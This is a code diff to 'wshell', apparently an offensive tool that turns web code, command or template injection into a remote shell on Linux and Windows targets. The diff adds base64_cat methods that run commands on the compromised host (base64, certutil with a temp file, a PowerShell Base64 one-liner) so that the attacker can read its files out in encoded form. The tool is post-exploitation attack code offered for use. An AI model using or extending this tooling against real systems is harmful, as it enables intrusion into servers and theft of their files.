@@ -6,7 +6,7 @@ import requests
 from typing import Optional, Dict
 from urllib.parse import quote as url_encode
 
-from wshell import settings
+from wshell import settings, utils
 from wshell.errors import CommandExecutionError, OsDetectionError, TargetUnreachableError
 
 # Disable warnings related to unverified SSL certs
@@ -188,6 +188,9 @@ class CommandInjector:
         """ Get the specific prompt string for the target OS """
         raise NotImplementedError
 
+    def base64_cat(self, filename: str) -> str:
+        raise NotImplementedError
+
 
 class LinuxCommandInjector(CommandInjector):
     """ Linux HTTP Client with RCE capabilities via {code,command,template} injection """
@@ -204,6 +207,9 @@ class LinuxCommandInjector(CommandInjector):
             self.cwd = "."
         return super().change_directory(directory)
 
+    def base64_cat(self, filename: str) -> str:
+        return self.execute(f"base64 {filename} 2>&1")
+
 
 class WindowsCmdCommandInjector(CommandInjector):
     """ Windows (with Command Prompt) HTTP Client with RCE capabilities via {code,command,template} injection """
@@ -215,6 +221,22 @@ class WindowsCmdCommandInjector(CommandInjector):
     def get_prompt(self):
         # Outputs like "C:\Users\wshell>"
         return f"{self.current_directory()}> "
+
+    def base64_cat(self, filename: str) -> str:
+        random_filename = utils.random_string()
+        self.execute(f"certutil -encode '{filename}' %TEMP%/{random_filename}")
+        base64_output = self.execute(f"type %TEMP%/{random_filename}")
+
+        # `certutil` output will be something like:
+        #
+        # -----BEGIN CERTIFICATE-----
+        # V1NoZWxsIGxldHMgeW91IHR1cm4gYSB3ZWItYmFzZWQge2NvZGUsY29tbWFuZCx0ZW1wbGF0ZX0g
+        # aW5qZWN0aW9uIGluIGEgZnVsbCBmZWF0dXJlZCBzaGVsbCB3aXRoIGVhc2UuCg==
+        # -----END CERTIFICATE-----
+        #
+        # So, we need to remove the first and the last lines
+        #
+        return base64_output[1:-2]
 
 
 class WindowsPshCommandInjector(CommandInjector):
@@ -236,6 +258,11 @@ class WindowsPshCommandInjector(CommandInjector):
     def get_prompt(self):
         # Outputs like "PS C:\Users\wshell>"
         return f"PS {self.current_directory()}> "
+
+    def base64_cat(self, filename: str) -> str:
+        return self.execute(
+            f"$file_content = Get-Content '{filename}'; [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($file_content))"
+        )
 
 
 def get_command_injector(os: OSEnum = None, *args, **kwargs):
